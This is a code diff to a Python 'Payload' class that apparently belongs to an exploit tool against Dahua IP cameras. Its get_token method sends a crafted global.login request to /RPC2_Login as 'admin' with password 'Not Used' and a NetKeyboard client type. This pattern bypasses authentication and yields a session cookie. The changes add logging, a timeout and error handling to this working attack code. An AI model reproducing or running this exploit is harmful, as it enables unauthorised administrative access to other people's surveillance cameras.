@@ -1,6 +1,7 @@
 from typing import Union
 import httpx
 import urllib3
+from utils.log import logger
 urllib3.disable_warnings()
 
 
@@ -11,7 +12,7 @@ class Payload(object):
         header = {"Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
                   "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin":  self.addr+"/", "Referer":  self.addr+"/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
 
-        self.session = httpx.Client(headers=header, verify=False)
+        self.session = httpx.Client(headers=header, verify=False, timeout=5)
         self.token = None
 
     def get_token(self) -> Union[bool, str]:
@@ -19,15 +20,19 @@ class Payload(object):
         url = self.addr+"/RPC2_Login"
         post_json = {"id": 1, "method": "global.login", "params": {"authorityType": "Default", "clientType": "NetKeyboard",
                                                                    "loginType": "Direct", "password": "Not Used", "passwordType": "Default", "userName": "admin"}, "session": 0}
-        r = self.session.post(url, json=post_json).json()
+        r = self.session.post(url, json=post_json)
+        if r.status_code != 200:
+            logger.info(f"[-] 大华摄像头 token 获取失败 请求码:{r.status_code}")
+            return False
+        r = r.json()
         if 'True' in str(r):
             self.token = r["session"]
 
-            print(f"[+] {self.ip} 大华摄像头 token 获取成功 {self.token}")
+            logger.success(f"[+] {self.ip} 大华摄像头 token 获取成功 {self.token}")
             self.session.cookies["DWebClientSessionID"] = self.token
             return self.token
         else:
-            print(f"[-] 大华摄像头 token 获取失败")
+            logger.info(f"[-] 大华摄像头 token 获取失败")
             return False
 
     def login(self):
